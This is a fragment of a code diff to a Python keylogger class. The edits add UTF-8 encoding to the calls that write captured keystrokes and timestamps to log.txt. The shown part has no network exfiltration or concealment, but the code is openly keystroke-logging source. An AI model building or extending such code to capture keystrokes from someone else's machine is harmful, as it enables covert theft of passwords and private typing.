@@ -8,7 +8,7 @@ buttons = ['Key.tab', 'Key.ctrl', 'Key.alt', 'Key.left', 'Key.right', 'Key.up', 
            'Key.home', 'Key.end', 'Key.insert', 'Key.shift_r', 'Key.ctrt_l', 'Key.f1', 'Key.f2', 'Key.f3',
            'Key.f4', 'Key.f5', 'Key.f6', 'Key.f7', 'Key.f8', 'Key.f9', 'Key.f10', 'Key.f11', 'Key.f12', 'Key.esc']
 
-
+encoding = 'utf-8'
 
 
 class Keylogger:
@@ -29,9 +29,9 @@ class Keylogger:
     def write_file(self, key):
         # print(self.count)
             # print(self.keys)
-        with open('log.txt', 'a+') as file:
+        with open('log.txt', 'a+', encoding=encoding) as file:
             k = str(key).replace("'", "")
-
+            # print(k)
             if k.find("backspace") > 0:
                 file.write('DELETE ')
 
@@ -47,7 +47,7 @@ class Keylogger:
             file.flush()
 
     def write_time(self):
-        with open('log.txt', 'a+') as file:
+        with open('log.txt', 'a+', encoding=encoding) as file:
             file.write('\n' + '\n' + str(datetime.datetime.now()) + '\n')
 
 
